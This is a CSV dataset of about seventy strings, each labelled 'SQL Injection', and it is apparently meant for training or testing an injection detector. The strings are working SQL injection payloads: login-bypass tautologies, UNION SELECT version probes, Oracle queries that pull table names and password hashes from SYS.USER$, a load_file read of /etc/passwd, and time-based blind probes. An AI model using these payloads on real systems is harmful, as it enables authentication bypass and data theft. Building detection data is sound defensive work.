Script,Label
""" or pg_sleep  (  __TIME__  )  --",SQL Injection
create user name identified by pass123 temporary tablespace temp default tablespace users;,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",SQL Injection
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,SQL Injection
select * from users where id  =  1 +$+ or 1  =  1 -- 1,SQL Injection
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",SQL Injection
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",SQL Injection
? or 1  =  1 --,SQL Injection
 )   or   (  'a'  =  'a,SQL Injection
admin' or 1  =  1#,SQL Injection
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",SQL Injection
or 1  =  1 --,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",SQL Injection
distinct,SQL Injection
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',SQL Injection
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",SQL Injection
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,SQL Injection
"admin"" or ""1""  =  ""1""--",SQL Injection
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",SQL Injection
insert,SQL Injection
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",SQL Injection
"or 1  =  1 or """"  =  ",SQL Injection
/**/or/**/1/**/  =  /**/1,SQL Injection
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",SQL Injection
or 1  =  1/*,SQL Injection
%27 or 1  =  1,SQL Injection
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",SQL Injection
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",SQL Injection
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",SQL Injection
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',SQL Injection
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",SQL Injection
or 1 --',SQL Injection
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",SQL Injection
"admin"" or 1  =  1#",SQL Injection
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
\x27UNION SELECT,SQL Injection
PRINT,SQL Injection
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",SQL Injection
or 1  =  1--,SQL Injection
1 or pg_sleep  (  __TIME__  )  --,SQL Injection
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",SQL Injection
admin'  )   or   (  '1'  =  '1'/*,SQL Injection
or 2 between 1 and 3,SQL Injection
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",SQL Injection
admin' or '1'  =  '1,SQL Injection
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,SQL Injection
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
""" or 0  =  0 --",SQL Injection
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",SQL Injection
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",SQL Injection
char%4039%41%2b%40SELECT,SQL Injection
